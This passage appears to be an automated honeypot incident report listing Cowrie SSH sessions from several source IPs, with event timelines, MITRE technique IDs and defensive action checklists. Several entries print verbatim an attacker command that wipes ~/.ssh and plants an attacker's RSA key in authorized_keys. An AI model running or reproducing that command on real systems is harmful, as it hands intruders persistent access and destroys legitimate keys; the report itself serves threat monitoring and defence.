| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:55:56` | `cowrie.session.connect` |
| `2026-04-22 04:55:56` | `cowrie.client.version` |
| `2026-04-22 04:55:56` | `cowrie.client.kex` |
| `2026-04-22 04:55:57` | `cowrie.login.success` |
| `2026-04-22 04:55:57` | `cowrie.session.params` |
| `2026-04-22 04:55:57` | `cowrie.command.input` |
| `2026-04-22 04:55:57` | `cowrie.command.failed` |
| `2026-04-22 04:55:57` | `cowrie.log.closed` |
| `2026-04-22 04:55:57` | `cowrie.session.params` |
| `2026-04-22 04:55:57` | `cowrie.command.input` |
| `2026-04-22 04:55:57` | `cowrie.session.file_download` |
| `2026-04-22 04:55:57` | `cowrie.log.closed` |
| `2026-04-22 04:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4b9abc2ce91

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-04-22 04:55 |
| **Last Seen** | 2026-04-22 04:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:55:59` | `cowrie.session.connect` |
| `2026-04-22 04:55:59` | `cowrie.client.version` |
| `2026-04-22 04:55:59` | `cowrie.client.kex` |
| `2026-04-22 04:55:59` | `cowrie.login.success` |
| `2026-04-22 04:55:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70054944353

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:57 |
| **Last Seen** | 2026-04-22 04:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:57:53` | `cowrie.session.connect` |
| `2026-04-22 04:57:53` | `cowrie.client.version` |
| `2026-04-22 04:57:53` | `cowrie.client.kex` |
| `2026-04-22 04:57:53` | `cowrie.login.success` |
| `2026-04-22 04:57:54` | `cowrie.session.params` |
| `2026-04-22 04:57:54` | `cowrie.command.input` |
| `2026-04-22 04:57:54` | `cowrie.command.failed` |
| `2026-04-22 04:57:54` | `cowrie.log.closed` |
| `2026-04-22 04:57:54` | `cowrie.session.params` |
| `2026-04-22 04:57:54` | `cowrie.command.input` |
| `2026-04-22 04:57:54` | `cowrie.session.file_download` |
| `2026-04-22 04:57:54` | `cowrie.log.closed` |
| `2026-04-22 04:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77d3c98daace

| Field | Detail |
|---|---|
| **Source IP** | `51.163.39[.]213` |
| **First Seen** | 2026-04-22 04:57 |
| **Last Seen** | 2026-04-22 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 04:57:56` | `cowrie.session.connect` |
| `2026-04-22 04:57:56` | `cowrie.client.version` |
| `2026-04-22 04:57:56` | `cowrie.client.kex` |
| `2026-04-22 04:57:57` | `cowrie.login.success` |
| `2026-04-22 04:57:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.163.39[.]213` to AbuseIPDB if not already reported
- [ ] Block `51.163.39[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c922a0fcdf3

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 05:03 |
| **Last Seen** | 2026-04-22 05:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:03:33` | `cowrie.session.connect` |
| `2026-04-22 05:03:33` | `cowrie.client.version` |
| `2026-04-22 05:03:33` | `cowrie.client.kex` |
| `2026-04-22 05:03:34` | `cowrie.login.success` |
| `2026-04-22 05:03:34` | `cowrie.session.params` |
| `2026-04-22 05:03:34` | `cowrie.command.input` |
| `2026-04-22 05:03:34` | `cowrie.command.failed` |
| `2026-04-22 05:03:34` | `cowrie.log.closed` |
| `2026-04-22 05:03:35` | `cowrie.session.params` |
| `2026-04-22 05:03:35` | `cowrie.command.input` |
| `2026-04-22 05:03:35` | `cowrie.session.file_download` |
| `2026-04-22 05:03:35` | `cowrie.log.closed` |
| `2026-04-22 05:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83398cf0d0e1

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 05:03 |
| **Last Seen** | 2026-04-22 05:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:03:38` | `cowrie.session.connect` |
| `2026-04-22 05:03:38` | `cowrie.client.version` |
| `2026-04-22 05:03:38` | `cowrie.client.kex` |
| `2026-04-22 05:03:39` | `cowrie.login.success` |
| `2026-04-22 05:03:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-683294bc3496

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:05 |
| **Last Seen** | 2026-04-22 05:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:05:32` | `cowrie.session.connect` |
| `2026-04-22 05:05:32` | `cowrie.client.version` |
| `2026-04-22 05:05:32` | `cowrie.client.kex` |
| `2026-04-22 05:05:32` | `cowrie.login.success` |
| `2026-04-22 05:05:33` | `cowrie.session.params` |
| `2026-04-22 05:05:33` | `cowrie.command.input` |
| `2026-04-22 05:05:33` | `cowrie.command.failed` |
| `2026-04-22 05:05:33` | `cowrie.log.closed` |
| `2026-04-22 05:05:33` | `cowrie.session.params` |
| `2026-04-22 05:05:33` | `cowrie.command.input` |
| `2026-04-22 05:05:33` | `cowrie.session.file_download` |
| `2026-04-22 05:05:33` | `cowrie.log.closed` |
| `2026-04-22 05:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83b494b4fc8d

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:05 |
| **Last Seen** | 2026-04-22 05:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:05:36` | `cowrie.session.connect` |
| `2026-04-22 05:05:36` | `cowrie.client.version` |
| `2026-04-22 05:05:36` | `cowrie.client.kex` |
| `2026-04-22 05:05:36` | `cowrie.login.success` |
| `2026-04-22 05:05:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e910eccd090

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 05:08 |
| **Last Seen** | 2026-04-22 05:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:08:57` | `cowrie.session.connect` |
| `2026-04-22 05:08:57` | `cowrie.client.version` |
| `2026-04-22 05:08:58` | `cowrie.client.kex` |
| `2026-04-22 05:08:58` | `cowrie.login.success` |
| `2026-04-22 05:08:59` | `cowrie.session.params` |
| `2026-04-22 05:08:59` | `cowrie.command.input` |
| `2026-04-22 05:08:59` | `cowrie.command.failed` |
| `2026-04-22 05:08:59` | `cowrie.log.closed` |
| `2026-04-22 05:09:00` | `cowrie.session.params` |
| `2026-04-22 05:09:00` | `cowrie.command.input` |
| `2026-04-22 05:09:00` | `cowrie.session.file_download` |
| `2026-04-22 05:09:00` | `cowrie.log.closed` |
| `2026-04-22 05:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adf92de3e963

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 05:09 |
| **Last Seen** | 2026-04-22 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:09:03` | `cowrie.session.connect` |
| `2026-04-22 05:09:03` | `cowrie.client.version` |
| `2026-04-22 05:09:03` | `cowrie.client.kex` |
| `2026-04-22 05:09:04` | `cowrie.login.success` |
| `2026-04-22 05:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32a8ee4b0535

| Field | Detail |
|---|---|
| **Source IP** | `139.196.218[.]159` |
| **First Seen** | 2026-04-22 05:09 |
| **Last Seen** | 2026-04-22 05:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:09:19` | `cowrie.session.connect` |
| `2026-04-22 05:09:19` | `cowrie.client.version` |
| `2026-04-22 05:09:19` | `cowrie.client.kex` |
| `2026-04-22 05:09:20` | `cowrie.login.success` |
| `2026-04-22 05:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.196.218[.]159` to AbuseIPDB if not already reported
- [ ] Block `139.196.218[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca978b8da19

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:12 |
| **Last Seen** | 2026-04-22 05:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:12:02` | `cowrie.session.connect` |
| `2026-04-22 05:12:02` | `cowrie.client.version` |
| `2026-04-22 05:12:02` | `cowrie.client.kex` |
| `2026-04-22 05:12:03` | `cowrie.login.success` |
| `2026-04-22 05:12:03` | `cowrie.session.params` |
| `2026-04-22 05:12:03` | `cowrie.command.input` |
| `2026-04-22 05:12:03` | `cowrie.command.failed` |
| `2026-04-22 05:12:04` | `cowrie.log.closed` |
| `2026-04-22 05:12:04` | `cowrie.session.params` |
| `2026-04-22 05:12:04` | `cowrie.command.input` |
| `2026-04-22 05:12:04` | `cowrie.session.file_download` |
| `2026-04-22 05:12:04` | `cowrie.log.closed` |
| `2026-04-22 05:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-733ea5175bb1

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:12 |
| **Last Seen** | 2026-04-22 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:12:06` | `cowrie.session.connect` |
| `2026-04-22 05:12:06` | `cowrie.client.version` |
| `2026-04-22 05:12:07` | `cowrie.client.kex` |
| `2026-04-22 05:12:07` | `cowrie.login.success` |
| `2026-04-22 05:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be0c5f90bbe1

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 05:12 |
| **Last Seen** | 2026-04-22 05:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:12:31` | `cowrie.session.connect` |
| `2026-04-22 05:12:31` | `cowrie.client.version` |
| `2026-04-22 05:12:31` | `cowrie.client.kex` |
| `2026-04-22 05:12:32` | `cowrie.login.success` |
| `2026-04-22 05:12:33` | `cowrie.session.params` |
| `2026-04-22 05:12:33` | `cowrie.command.input` |
| `2026-04-22 05:12:33` | `cowrie.command.failed` |
| `2026-04-22 05:12:33` | `cowrie.log.closed` |
| `2026-04-22 05:12:33` | `cowrie.session.params` |
| `2026-04-22 05:12:33` | `cowrie.command.input` |
| `2026-04-22 05:12:33` | `cowrie.session.file_download` |
| `2026-04-22 05:12:33` | `cowrie.log.closed` |
| `2026-04-22 05:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ded7d5d1b4bf

| Field | Detail |
|---|---|
| **Source IP** | `172.206.32[.]4` |
| **First Seen** | 2026-04-22 05:12 |
| **Last Seen** | 2026-04-22 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:12:36` | `cowrie.session.connect` |
| `2026-04-22 05:12:36` | `cowrie.client.version` |
| `2026-04-22 05:12:36` | `cowrie.client.kex` |
| `2026-04-22 05:12:37` | `cowrie.login.success` |
| `2026-04-22 05:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.206.32[.]4` to AbuseIPDB if not already reported
- [ ] Block `172.206.32[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbc8f20633a2

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:13 |
| **Last Seen** | 2026-04-22 05:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:13:38` | `cowrie.session.connect` |
| `2026-04-22 05:13:38` | `cowrie.client.version` |
| `2026-04-22 05:13:38` | `cowrie.client.kex` |
| `2026-04-22 05:13:39` | `cowrie.login.success` |
| `2026-04-22 05:13:39` | `cowrie.session.params` |
| `2026-04-22 05:13:39` | `cowrie.command.input` |
| `2026-04-22 05:13:39` | `cowrie.command.failed` |
| `2026-04-22 05:13:40` | `cowrie.log.closed` |
| `2026-04-22 05:13:40` | `cowrie.session.params` |
| `2026-04-22 05:13:40` | `cowrie.command.input` |
| `2026-04-22 05:13:40` | `cowrie.session.file_download` |
| `2026-04-22 05:13:40` | `cowrie.log.closed` |
| `2026-04-22 05:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0de64a7430f

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:13 |
| **Last Seen** | 2026-04-22 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 05:13:42` | `cowrie.session.connect` |
| `2026-04-22 05:13:42` | `cowrie.client.version` |
| `2026-04-22 05:13:42` | `cowrie.client.kex` |
| `2026-04-22 05:13:43` | `cowrie.login.success` |
| `2026-04-22 05:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.30.162[.]19` to AbuseIPDB if not already reported
- [ ] Block `81.30.162[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea5ee1f8b919

| Field | Detail |
|---|---|
| **Source IP** | `81.30.162[.]19` |
| **First Seen** | 2026-04-22 05:14 |
| **Last Seen** | 2026-04-22 05:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
